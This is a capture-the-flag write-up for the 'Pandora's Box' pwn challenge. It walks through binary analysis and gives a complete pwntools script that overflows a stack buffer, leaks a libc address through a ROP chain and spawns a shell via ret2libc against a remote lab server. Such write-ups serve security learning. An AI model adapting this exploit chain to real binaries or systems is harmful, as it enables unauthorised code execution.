# Pandora's Box WriteUp by Om Honrao (@Inv1s1bl3#7047)

## Challenge Description
```
You stumbled upon one of Pandora's mythical boxes. Would you be curious enough to open it and see what's inside, or would you opt to give it to your team for analysis?
```

## Challenge Files
```
- pwn_pandoras_box.zip
    ./glibc
    ./glibc/ld-linux-x86-64.so.2
    ./glibc/libc.so.6
    ./flag.txt
    ./pb
```

## Challenge Solution
Pwn category which was weakest for me but somehow managed to do few pwns. We start with initial analysis like `checksec` and `file` command. We get the following output:

Checksec:
```bash
$ checksec pb
[*] '/home/Inv1s1bl3/ctf/Cyber-Apocalypse-2023-The-Cursed-Mission-Writeups/Pwning/Pandoras_Box/challenge/pb'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```
File:
```bash
$ file pb
pb: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=d0165634ba8886a0cdf61584d8c941d30ff3820e, for GNU/Linux 3.2.0, not stripped
```
So we don't have canary no need to worry about it NX is enabled so we can't run shellcode directly. Lets check the binary with ghidra once and then will head over to gdb.

Main code is pretty simple:
```c 
undefined8 main(void)

{
  setup();
  cls();
  banner();
  box();
  return 0;
}
```
I can't see anything special here but it does call certain functions like setup, cls, banner and box. I don't think i should explain what setup, cls and banner does. So lets check the box function because that's where we have vulnerability:
```c
void box(void)

{
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  fwrite("This is one of Pandora\'s mythical boxes!\n\nWill you open it or Return it to the Library  for analysis?\n\n1. Open.\n2. Return.\n\n>> "
         ,1,0x7e,stdout);
  local_10 = read_num();
  if (local_10 != 2) {
    fprintf(stdout,"%s\nWHAT HAVE YOU DONE?! WE ARE DOOMED!\n\n",&DAT_004021c7);
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  fwrite("\nInsert location of the library: ",1,0x21,stdout);
  fgets((char *)&local_38,0x100,stdin);
  fwrite("\nWe will deliver the mythical box to the Library for analysis, thank you!\n\n",1,0x4b,
         stdout);
  return;
}
```
So this just declares some variables and then uses `fwrite` to print some text further it uses `read_num` function to read input from user. If the input is not equal to 2 then it will exit the program. So we have to input 2 to continue. After that it uses `fgets` to read input from user and stores it in `local_38` variable. So we have to input some string here. It asks to enter location of library this made me think this should be something related to `Ret2Libc` attack and indeed it was! We can use `ROP` technique to leak out the Libc Base address and with the base we can find the System Address and then we can use `Ret2Libc` to spawn a shell. So lets start with `ROP` first.

I wasn't sure if ASLR is on on the server so each time i ran my code made a leak (I used puts leak). We leak out an address and subtract the offset of it from the starting of libc to get the libc base address.
And then we return back to box() because we don't want program to end right. Further we craft our payload and get the shell!
```python
from pwn import*
#context.log_level       = "DEBUG"
context.arch            = "amd64"

#p = process("./pb")
   
p = remote('165.232.98.69',32149)

elf = context.binary = ELF('./pb', checksec=False)

puts = 0x401030
p.sendlineafter(b">>", b"2")

# Get leak
payload = flat(
    cyclic(0x38),
    0x000000000040142b, #poprdi
    0x403fa0,
    0x401030,
    0x00000000004013a6
    )
p.sendlineafter(b"of the library: ",payload)

p.recvuntil(b"is, thank you!\n\n")
leak = int.from_bytes(p.recv(6),"little") 

#Get libc base
base = leak - 0x80ed0
print("base", hex(base))

p.sendlineafter(b">>", b"2")

#Get shell
payload = flat(
    cyclic(56),
    0x0000000000401016,
    0x000000000040142b,
    base+0x1d8698,
    base+0x0000000000050d60

    )
    
p.sendline(payload)
```

## Flag
```
HTB{r3turn_2_P4nd0r4?!}
```

